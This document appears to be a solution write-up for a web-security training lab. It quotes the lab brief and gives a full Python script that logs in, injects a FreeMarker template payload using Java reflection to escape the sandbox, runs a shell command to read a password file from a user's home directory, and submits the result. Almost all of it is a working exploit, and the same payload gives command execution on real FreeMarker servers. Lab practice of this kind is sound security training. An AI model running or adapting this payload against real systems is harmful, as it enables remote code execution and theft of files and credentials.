# Server-side template injection in a sandboxed environment

> This lab uses the Freemarker template engine. It is vulnerable to server-side template injection due to its poorly implemented sandbox. To solve the lab, break out of the sandbox to read the file `my_password.txt` from Carlos's home directory. Then submit the contents of the file.
> You can log in to your own account using the following credentials:
> `content-manager:C0nt3ntM4n4g3r`


```python
import requests
import sys
from bs4 import BeautifulSoup

# --- Configuration ---
# Lab: Server-side template injection in a sandboxed environment (FreeMarker)
# GOAL: Bypass the FreeMarker sandbox using Java Reflection to read a password file.
BASE_URL = "https://0a38003e04ef25828122258600620010.web-security-academy.net"

def get_csrf_token(session, url):
    """
    Extracts the anti-CSRF token from the given URL.
    """
    response = session.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')
    return soup.find("input", {"name": "csrf"})['value']

def create_authenticated_session(base_url):
    """
    Logs in as the content-manager and returns the active session.
    """
    login_url = f"{base_url}/login"
    session = requests.Session()
    
    print(f"[*] Authenticating at {login_url}...")
    csrf_token = get_csrf_token(session, login_url)
    
    credentials = {
        "username": "content-manager",
        "password": "C0nt3ntM4n4g3r",
        "csrf": csrf_token
    }
    
    response = session.post(login_url, data=credentials)
    
    if "Log out" in response.text:
        print("[+] Login Successful.")
        return session
    else:
        print("[-] Login Failed.")
        sys.exit(1)

def exploit_freemarker_sandbox(base_url, session):
    """
    Exploits the FreeMarker sandbox bypass to recover the password.
    """
    # 1. Define Endpoints
    template_url = f"{base_url}/product/template?productId=1"
    submit_url = f"{base_url}/submitSolution"
    
    print(f"[*] Targeting Template Editor: {template_url}")
    
    # 2. Construct Payload (Java Reflection Bypass)
    # The sandbox blocks direct access to ?new() for Execute.
    # We bypass this by accessing the 'product' object's class loader.
    # This allows us to manually load the 'Execute' class from the system.
    reflection_payload = """<#assign classloader = product.class.protectionDomain.classLoader>
<#assign owc = classloader.loadClass("freemarker.template.ObjectWrapper")>
<#assign dwf = owc.getField("DEFAULT_WRAPPER").get(null)>
<#assign ec = classloader.loadClass("freemarker.template.utility.Execute")>
${dwf.newInstance(ec, null)("cat /home/carlos/my_password.txt")}"""
    
    csrf_token = get_csrf_token(session, template_url)
    
    data = {
        "template": reflection_payload,
        "template-action": "preview",
        "csrf": csrf_token
    }
    
    # 3. Extract the Password
    print(f"[*] Sending Reflection Payload...")
    response = session.post(template_url, data=data)
    
    # Parse the output
    soup = BeautifulSoup(response.text, 'html.parser')
    # The password will be rendered in the preview result div
    extracted_password = soup.find("div", {"id": "preview-result"}).text.strip()
    
    if not extracted_password:
        print("[-] Error: No output received. Sandbox bypass might have failed.")
        return

    print(f"[+] Extracted Password: {extracted_password}")
    
    # 4. Submit the Solution
    print(f"[*] Submitting Password to {submit_url}...")
    submission_data = {"answer": extracted_password}
    
    submit_response = session.post(submit_url, data=submission_data)
    
    # 5. Verify Success
    if "true" in submit_response.text.lower():
        print("[SUCCESS] Password accepted. Lab Solved!")
    else:
        print("[-] Submission failed. Check the extracted value.")

if __name__ == "__main__":
    session = create_authenticated_session(BASE_URL)
    exploit_freemarker_sandbox(BASE_URL, session)
```